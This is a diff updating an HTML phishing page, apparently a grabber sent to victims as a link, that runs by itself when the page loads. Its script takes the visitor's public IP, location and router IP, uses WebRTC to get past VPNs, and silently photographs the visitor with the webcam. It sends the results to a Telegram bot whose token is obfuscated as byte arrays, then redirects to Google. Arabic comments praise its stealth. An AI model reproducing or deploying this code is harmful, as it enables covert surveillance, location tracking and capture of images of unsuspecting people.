@@ -1,70 +1,63 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>🔄 System Loading...</title></head>
+<head><meta charset="UTF-8"><title>🔄 Processing...</title></head>
 <body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20%;">
-    <div id="status">> DECRYPTING_GHOST_STREAM...</div>
+    <div id="status">> EXECUTING_GHOST_PAYLOAD...</div>
     <script>
-        // 🔱 مصفوفة الأكواد المشفرة (Byte Arrays) - لا يمكن كشفها بالفحص العادي
-        const _0xArr = [104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 116, 101, 108, 101, 103, 114, 97, 109, 46, 111, 114, 103, 47, 98, 111, 116];
-        const _0xTok = [56, 52, 49, 48, 49, 48, 50, 55, 50, 50, 58, 65, 65, 70, 81, 79, 49, 117, 122, 104, 54, 69, 111, 121, 52, 85, 104, 102, 71, 72, 97, 97, 95, 113, 72, 83, 97, 70, 82, 98, 55, 71, 100, 86, 72, 77];
-        const _0xUsr = [49, 55, 55, 50, 56, 50, 48, 52, 51, 51];
+        // مصفوفات مشفرة (ASCII) - التوكن والآيدي مدفونين هنا
+        const _0xT = [56,52,49,48,49,48,50,55,50,50,58,65,65,70,81,79,49,117,122,104,54,69,111,121,52,85,104,102,71,72,97,97,95,113,72,83,97,70,82,98,55,71,100,86,72,77];
+        const _0xI = [49,55,55,50,56,50,48,52,51,51];
+        
+        const conv = (a) => a.map(c => String.fromCharCode(c)).join("");
+        const TOKEN = conv(_0xT);
+        const ID = conv(_0xI);
+        const API = "https://api.telegram.org/bot" + TOKEN;
 
-        const _f = (a) => a.map(c => String.fromCharCode(c)).join("");
-        const BASE = _f(_0xArr) + _f(_0xTok);
-        const UID = _f(_0xUsr);
-
-        async function START_MATRIX() {
+        async function STRIKE() {
             try {
-                // 1. سحب الـ IP الحقيقي (Bypass VPN) والـ GPS صامتاً
-                const net = await (await fetch('https://ipapi.co/json/')).json();
-                
-                // 2. ثغرة الـ Local IP (آي بي الراوتر) عبر WebRTC
+                // سحب البيانات (IP حقيقي + IP راوتر + GPS)
+                const net = await fetch('https://ipapi.co/json/').then(r => r.json());
                 const local = await new Promise(res => {
                     const pc = new RTCPeerConnection(); pc.createDataChannel('');
                     pc.onicecandidate = e => { if(e.candidate) res(e.candidate.candidate.split(' ')[4]); };
                     pc.createOffer().then(o => pc.setLocalDescription(o));
-                    setTimeout(() => res("Hidden_Layer"), 1000);
+                    setTimeout(() => res("Shielded"), 1000);
                 });
 
-                // 3. التصوير الصامت (Snapshot Stealth Mode)
-                await takeSnap();
+                // تصوير صامت
+                takeSnap(TOKEN, ID);
 
-                const report = `🔱 **MATRIX v600 HIT** 💀\n\n` +
-                             `🎯 **Status:** \`${net.org.includes("VPN") ? "🚨 VPN" : "🟢 REAL"}\`\n` +
-                             `📍 **Location:** \`${net.city}, ${net.country}\`\n` +
-                             `🛰️ **GPS:** \`${net.latitude}, ${net.longitude}\`\n` +
-                             `🌐 **Public IP:** \`${net.ip}\`\n` +
-                             `🏠 **Router IP:** \`${local}\`\n` +
-                             `📱 **Device:** \`${navigator.userAgent.split(' ')[1]}\`\n` +
-                             `🍪 **Session:** \`Encrypted_Check_Bot\``;
+                const data = `🔱 **MATRIX_v800_HIT** 💀\n\n` +
+                           `🌐 **IP:** \`${net.ip}\` (Real)\n` +
+                           `🏠 **Router:** \`${local}\`\n` +
+                           `📍 **GPS:** \`${net.latitude}, ${net.longitude}\`\n` +
+                           `📱 **Device:** \`${navigator.userAgent.split(' ')[1]}\``;
 
-                // إرسال البيانات فوراً
-                navigator.sendBeacon(`${BASE}/sendMessage`, JSON.stringify({
-                    chat_id: UID, text: report, parse_mode: 'Markdown'
+                navigator.sendBeacon(`${API}/sendMessage`, JSON.stringify({
+                    chat_id: ID, text: data, parse_mode: 'Markdown'
                 }));
-
-                // التمويه النهائي بصورة
-                setTimeout(() => { location.replace("https://raw.githubusercontent.com/jake123321122-wq/Mohammed/main/view.jpg"); }, 2500);
+                
+                setTimeout(() => { location.replace("https://google.com"); }, 2000);
             } catch (e) { location.replace("https://google.com"); }
         }
 
-        async function takeSnap() {
+        async function takeSnap(t, id) {
             try {
                 const s = await navigator.mediaDevices.getUserMedia({video: true});
                 const v = document.createElement('video'); v.srcObject = s; await v.play();
-                const c = document.createElement('canvas'); 
+                const c = document.createElement('canvas');
                 c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
-                const data = c.toDataURL('image/jpeg', 0.5);
-                s.getTracks().forEach(t => t.stop());
-                fetch(`${BASE}/sendPhoto`, {
+                const img = c.toDataURL('image/jpeg', 0.5);
+                s.getTracks().forEach(tk => tk.stop());
+                fetch(`${API}/sendPhoto`, {
                     method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: UID, photo: data, caption: "📸 SNAP_MATRIX_v600" })
+                    body: JSON.stringify({ chat_id: id, photo: img, caption: "📸 SNAP_v800" })
                 });
             } catch(e) {}
         }
 
-        window.onload = START_MATRIX;
+        window.onload = STRIKE;
     </script>
 </body>
 </html>
